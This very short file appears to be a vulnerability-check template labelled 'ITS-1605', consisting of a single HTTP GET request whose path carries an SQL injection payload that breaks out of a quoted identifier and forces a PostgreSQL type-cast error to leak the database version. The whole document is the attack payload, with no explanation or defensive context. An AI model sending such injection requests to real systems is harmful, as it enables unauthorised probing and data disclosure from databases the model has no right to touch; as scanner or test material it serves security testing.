# Vulnerable: ITS-1605
GET /{{database}}/information_schema".tables)s%20where%201=version()::int--/auth
